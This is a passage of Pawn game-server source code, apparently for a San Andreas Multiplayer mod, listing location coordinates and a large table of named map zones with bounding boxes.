	{-2695.51,810.70,50.57},//Player Garage: Paradiso
	{1293.61,2529.54,11.42},//Player Garage: Prickle Pine
	{1401.34,1903.08,11.99},//Player Garage: Redland West
	{2436.50,698.43,11.60},//Player Garage: Rockshore West
	{322.65,-1780.30,5.55},//Player Garage: Santa Maria Beach
	{917.46,2012.14,11.65},//Player Garage: Whitewood Estates
	{1641.14,-1526.87,14.30},//Commerce Region Loading Bay
	{-1617.58,688.69,-4.50},//San Fierro Police Garage
	{837.05,-1101.93,23.98},//Los Santos Cemetery
 	{-2057.8000,229.9000,35.6204}, // San Fierro
 	{-2366.0000,-1667.4000,484.1011}, // Mount Chiliad
 	{2503.7000,-1705.8000,13.5480}, // Grove Street
 	{1997.9000,1056.3000,10.8203}, // Las Venturas
 	{-2872.7000,2712.6001,275.2690}, // BaySide
 	{904.1000,608.0000,-32.3281}, // Unterwasser
 	{-236.9000,2663.8000,73.6513} // The big Cock
};

enum SAZONE_MAIN
{
    SAZONE_NAME[38],
    Float:SAZONE_AREA[6]
};
#define MAX_ZONE_NAME                                                         38
static const gSAZones[ 364 ][ SAZONE_MAIN ] = {
    {"The Big Ear",                 {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
    {"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
    {"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
    {"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
    {"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
    {"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
    {"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
    {"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
    {"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
    {"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
    {"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
    {"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
    {"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
    {"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
    {"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
    {"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
    {"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
    {"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
    {"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
    {"Blackfield Section",          {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
    {"Blackfield Section",          {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
    {"Blackfield Section",          {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
    {"Blackfield Section",          {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
    {"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
    {"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
    {"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
    {"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
    {"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
    {"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
    {"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
    {"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
    {"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
    {"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
    {"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
    {"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
    {"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
    {"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
    {"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
    {"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
    {"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
    {"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
    {"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
    {"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
    {"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
    {"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
    {"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
    {"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
    {"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
    {"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
    {"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
    {"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
    {"Downtown Nice Guys ",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
    {"Downtown Nice Guys ",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
    {"Downtown Nice Guys ",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
    {"Downtown Nice Guys ",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
    {"Downtown Nice Guys ",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
    {"Downtown Nice Guys ",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
    {"Downtown Nice Guys ",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
    {"Downtown Nice Guys ",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
    {"Downtown Nice Guys ",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
    {"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
    {"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
    {"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
    {"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
    {"East Nice Guys ",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
    {"East Nice Guys ",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
    {"East Nice Guys ",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
    {"East Nice Guys ",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
    {"East Nice Guys ",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
    {"East Nice Guys ",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
    {"East Nice Guys ",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
    {"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
    {"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
    {"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
    {"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
    {"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
    {"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
    {"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
    {"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
    {"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
    {"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
    {"Easter Bay Chemical",         {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
    {"Easter Bay Chemical",         {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
    {"Castillo del Diablo",         {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
    {"Castillo del Diablo",         {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
    {"Castillo del Diablo",         {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
    {"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
    {"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
    {"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
    {"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
    {"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
    {"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
    {"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
    {"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
    {"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
    {"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
    {"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
    {"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
    {"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
    {"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
    {"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
    {"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
    {"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
    {"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
    {"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
    {"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
    {"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
    {"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
    {"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
    {"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
    {"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
    {"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
    {"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
    {"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
    {"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
    {"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
    {"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
    {"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
    {"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
    {"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
    {"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
    {"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
    {"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
    {"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
    {"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
    {"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
    {"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
    {"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
    {"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
    {"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
    {"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
    {"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
    {"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
    {"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
    {"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
    {"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
    {"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
    {"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
    {"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
    {"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
    {"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
    {"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
    {"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
    {"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
    {"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
    {"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
    {"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
    {"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
    {"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
    {"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
    {"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
    {"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
    {"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
    {"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
    {"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
    {"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
    {"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
    {"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
    {"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
    {"KACC Military Fuels",         {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
    {"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
    {"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
    {"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
    {"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
    {"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
    {"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
    {"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
    {"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
    {"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
    {"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
    {"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
    {"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
    {"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
    {"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
    {"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
    {"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
    {"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
    {"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
    {"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
    {"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
    {"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
    {"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
    {"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
    {"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
    {"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
    {"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
    {"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
    {"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
    {"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
    {"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
    {"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
    {"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
    {"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
    {"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
    {"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
    {"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
    {"LS International",            {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
    {"LS International",            {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
    {"LS International",            {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
    {"LS International",            {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
    {"LS International",            {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
    {"LS International",            {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
    {"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
    {"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
    {"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
    {"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
    {"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
    {"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
    {"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
    {"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
    {"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
    {"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
    {"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
    {"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
    {"Montgomery Section",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
    {"Montgomery Section",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
    {"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
    {"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
    {"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
    {"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
    {"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
    {"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
    {"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
    {"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
    {"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
    {"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
    {"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
    {"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
    {"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
    {"Mulholland Section",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
    {"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
    {"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
    {"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
    {"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
    {"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
    {"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
    {"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
    {"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
    {"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
    {"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
    {"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
    {"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
    {"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
    {"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
    {"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
    {"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
    {"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
    {"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
    {"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
    {"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
    {"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
    {"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
    {"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
    {"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
    {"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
    {"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
    {"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
    {"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
    {"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
    {"Randolph Ind. Estate",        {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
    {"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
    {"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
    {"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
    {"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
    {"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
    {"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
    {"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
    {"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
    {"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
    {"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
    {"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
    {"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
    {"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
    {"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
    {"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
    {"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
    {"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
    {"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
    {"Robada Section",              {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
    {"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
    {"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
    {"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
    {"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
    {"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
    {"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
    {"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
    {"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
    {"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
    {"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
    {"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
    {"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
    {"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
    {"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
    {"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
    {"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
    {"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
    {"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
    {"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
    {"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
    {"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
    {"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
    {"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
    {"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
    {"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
    {"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
    {"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
    {"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
    {"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
    {"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
    {"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
    {"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
    {"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
    {"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
    {"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
    {"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
    {"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
    {"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
    {"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
    {"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
    {"Four Dragons Casino",         {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
    {"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
    {"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
    {"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
    {"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
    {"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
    {"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
    {"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
